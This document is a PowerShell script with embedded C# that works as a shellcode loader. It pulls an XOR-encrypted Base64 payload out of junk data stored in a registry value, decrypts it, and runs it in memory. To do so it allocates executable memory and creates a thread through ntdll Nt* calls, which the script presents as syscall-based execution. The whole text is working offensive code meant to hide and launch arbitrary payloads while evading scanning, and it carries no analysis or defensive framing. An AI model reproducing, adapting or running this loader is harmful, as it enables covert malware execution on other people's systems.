# Pure Syscall Shellcode Execution with Decryption
$code = @'
using System;
using System.Runtime.InteropServices;

public class SyscallExecutor {
    
    [DllImport("ntdll.dll")]
    public static extern uint NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        uint AllocationType,
        uint Protect);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        uint BufferLength,
        out uint BytesWritten);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtCreateThreadEx(
        out IntPtr ThreadHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr StartAddress,
        IntPtr Parameter,
        bool CreateSuspended,
        uint StackZeroBits,
        uint SizeOfStackCommit,
        uint SizeOfStackReserve,
        IntPtr BytesBuffer);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtWaitForSingleObject(
        IntPtr Handle,
        bool Alertable,
        IntPtr Timeout);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtClose(IntPtr Handle);
    
    public static void ExecuteShellcode(byte[] shellcode) {
        IntPtr allocAddr = IntPtr.Zero;
        IntPtr regionSize = (IntPtr)shellcode.Length;
        
        uint status = NtAllocateVirtualMemory(
            (IntPtr)(-1),
            ref allocAddr,
            IntPtr.Zero,
            ref regionSize,
            0x3000,
            0x40
        );
        if (status != 0) return;
        
        uint bytesWritten;
        status = NtWriteVirtualMemory(
            (IntPtr)(-1),
            allocAddr,
            shellcode,
            (uint)shellcode.Length,
            out bytesWritten
        );
        if (status != 0) return;
        
        IntPtr hThread;
        status = NtCreateThreadEx(
            out hThread,
            0x1FFFFF,
            IntPtr.Zero,
            (IntPtr)(-1),
            allocAddr,
            IntPtr.Zero,
            false,
            0, 0, 0,
            IntPtr.Zero
        );
        
        if (status == 0 && hThread != IntPtr.Zero) {
            NtWaitForSingleObject(hThread, false, IntPtr.Zero);
            NtClose(hThread);
        }
    }
}
'@

Add-Type -TypeDefinition $code -Language CSharp

function Decrypt-Shellcode {
    param([string]$EncryptedBase64, [string]$KeyString)
    try {
        $encryptedBytes = [System.Convert]::FromBase64String($EncryptedBase64)
        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($KeyString)
        $keyBytes = $keyBytes * (($encryptedBytes.Length / $keyBytes.Length) + 1)
        $keyBytes = $keyBytes[0..($encryptedBytes.Length-1)]
        $decrypted = New-Object byte[] $encryptedBytes.Length
        for ($i=0; $i -lt $encryptedBytes.Length; $i++) {
            $decrypted[$i] = $encryptedBytes[$i] -bxor $keyBytes[$i]
        }
        return $decrypted
    }
    catch { 
        Write-Host "Decryption failed: $($_.Exception.Message)" -ForegroundColor Red
        return $null 
    }
}

# Retrieve from registry
$regPath = [Environment]::GetEnvironmentVariable("NYXCOR_SHELLCODE_REG_PATH", "User")
$regName = [Environment]::GetEnvironmentVariable("NYXCOR_SHELLCODE_REG_NAME", "User")
$keyString = [Environment]::GetEnvironmentVariable("NYXCOR_SHELLCODE_KEY", "User")

Write-Host "[+] Retrieving from registry: $regPath\$regName" -ForegroundColor Yellow
Write-Host "[+] Using key: $keyString" -ForegroundColor Yellow

$junkData = (Get-ItemProperty -Path $regPath -Name $regName).$regName

# Search for Base64 strings
$base64Pattern = '[A-Za-z0-9+/]{100,}={0,2}'
$matches = [regex]::Matches($junkData, $base64Pattern)

Write-Host "[+] Found $($matches.Count) potential encrypted payloads" -ForegroundColor Cyan

foreach ($match in $matches) {
    Write-Host "[+] Testing payload at index $($match.Index)" -ForegroundColor Gray
    $decryptedShellcode = Decrypt-Shellcode -EncryptedBase64 $match.Value -KeyString $keyString
    if ($decryptedShellcode -and $decryptedShellcode.Length -gt 100) {
        Write-Host "[+] Shellcode decrypted! Size: $($decryptedShellcode.Length) bytes" -ForegroundColor Green
        Write-Host "[+] Executing via pure NT syscalls..." -ForegroundColor Yellow
        
        [SyscallExecutor]::ExecuteShellcode($decryptedShellcode)
        
        Write-Host "[+] Shellcode execution completed!" -ForegroundColor Green
        break
    }
    else {
        Write-Host "[!] Decryption failed or payload too small" -ForegroundColor Red
    }
}